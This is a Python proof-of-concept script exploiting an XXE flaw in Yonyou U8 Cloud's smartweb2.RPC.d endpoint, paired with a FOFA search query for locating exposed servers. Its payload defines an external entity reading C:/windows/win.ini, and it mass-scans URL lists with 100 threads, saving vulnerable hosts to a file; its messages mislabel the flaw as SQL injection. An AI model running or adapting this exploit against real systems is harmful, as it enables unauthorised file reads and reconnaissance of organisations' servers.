#用友U8 Cloud smartweb2.RPC.d xxe漏洞

#fofa语法：app="用友-U8-Cloud"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
                           _                _    ___    _____  _____   _____      _ 
                          | |              | |  |__ \  |  __ \|  __ \ / ____|    | |
  ___ _ __ ___   __ _ _ __| |___      _____| |__   ) | | |__) | |__) | |       __| |
 / __| '_ ` _ \ / _` | '__| __\ \ /\ / / _ \ '_ \ / /  |  _  /|  ___/| |      / _` |
 \__ \ | | | | | (_| | |  | |_ \ V  V /  __/ |_) / /_ _| | \ \| |    | |____ | (_| |
 |___/_| |_| |_|\__,_|_|   \__| \_/\_/ \___|_.__/____(_)_|  \_\_|     \_____(_)__,_|
                                                                                    
                                                                                                                                                                                                                                         
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="用友U8 Cloud")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/hrss/dorado/smartweb2.RPC.d?__rpc=true'
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
        'Content-Length': '260',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data ='''
        __viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>
    '''
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.get(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and "16-bit app support" in res.text:
            print(f"f[+]该url存在SQL注入漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在SQL注入漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()